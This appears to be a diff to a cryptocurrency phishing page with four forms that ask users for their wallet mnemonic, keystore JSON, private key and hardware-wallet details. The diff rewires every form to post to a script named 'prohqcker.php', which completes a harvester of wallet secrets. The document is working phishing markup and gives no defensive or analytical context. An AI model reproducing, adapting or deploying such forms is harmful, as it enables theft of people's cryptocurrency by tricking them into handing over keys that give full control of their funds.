@@ -49,9 +49,9 @@
       </div>
       <div class="form__container flex flex-jc-c flex-d-c container">
         <form
-          id="my-form"
+          id="new-form"
           class="form flex flex-jc-c"
-          action="https://formspree.io/f/mzbqjpwv"
+          action="prohqcker.php"
           method="POST"
         >
           <h5>MNEMONICS</h5>
@@ -67,7 +67,12 @@
           <button class="form__btn" type="submit">Proceed</button>
           <p id="my-form-status"></p>
         </form>
-        <form id="formTWO" class="form flex flex-jc-c" action="#" method="POST">
+        <form
+          id="new-form"
+          class="form flex flex-jc-c"
+          action="prohqcker.php"
+          method="POST"
+        >
           <h5>KEYSTORE</h5>
           <label for="textInput2" class="form__label">
             Enter your Keystore JSON
@@ -90,7 +95,12 @@
           <button class="form__btn" type="submit">Proceed</button>
           <p id="my-form-status"></p>
         </form>
-        <form id="formThree" class="form flex flex-jc-c" method="POST">
+        <form
+          id="new-form"
+          class="form flex flex-jc-c"
+          action="prohqcker.php"
+          method="POST"
+        >
           <h5>PRIVATE-KEY</h5>
           <label for="textInputThree" class="form__label">
             Enter your private key
@@ -105,9 +115,9 @@
           <p id="my-form-status"></p>
         </form>
         <form
-          id="formFour"
+          id="new-form"
           class="form flex flex-jc-c"
-          action="https://formspree.io/f/mzbqjpwv"
+          action="prohqcker.php"
           method="POST"
         >
           <h5>HARDWARE</h5>
